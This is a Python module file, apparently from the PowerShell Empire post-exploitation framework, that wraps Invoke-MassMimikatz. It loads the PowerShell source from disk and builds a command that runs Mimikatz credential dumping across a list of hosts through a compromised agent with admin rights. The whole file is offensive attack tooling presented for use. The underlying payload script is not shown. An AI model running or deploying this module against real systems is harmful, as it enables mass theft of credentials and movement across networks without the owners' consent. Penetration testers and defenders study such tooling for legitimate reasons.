from lib.common import helpers
 
class Module:
 
    def __init__(self, mainMenu, params=[]):
 
        self.info = {
            'Name': 'Invoke-MassMimikatz',
 
            'Author': ['@JosephBialek', '@gentilkiwi', '@harmj0y'],
 
            'Description': ("Runs PowerTools' Invoke-MassMimikatz function "
                            "with hosts on pipeline or from file."),
 
            'Background' : True,
 
            'OutputExtension' : None,
 
            'NeedsAdmin' : True,
 
            'OpsecSafe' : False,
 
            'MinPSVersion' : '2',
 
            'Comments': [
                'http://clymb3r.wordpress.com/',
                'http://blog.gentilkiwi.com'
            ]
        }
 
        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Parameters' : {
                'Description'   :   'Custom Invoke-MassMimikatz parameters to run.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Hosts' : {
                'Description'   :   'Comma delimited list of hosts. Double quote hostnames for spaces, etc.',
                'Required'      :   False,
                'Value'         :   ''
            }
        }
 
        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
 
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value
 
 
    def generate(self):
 
        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/Invoke-MassMimikatz.ps1"
 
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""
 
        moduleCode = f.read()
        f.close()
 
        script = moduleCode
 
        # build the custom command with whatever options we want
        if self.options['Hosts']['Value'] != '':
            script += self.options['Hosts']['Value'] + " | Invoke-MassMimikatz"
        else:
            script += "Invoke-MassMimikatz"
            script += "'\"" + self.options['Parameters']['Value'] + "\"'"
 
        return script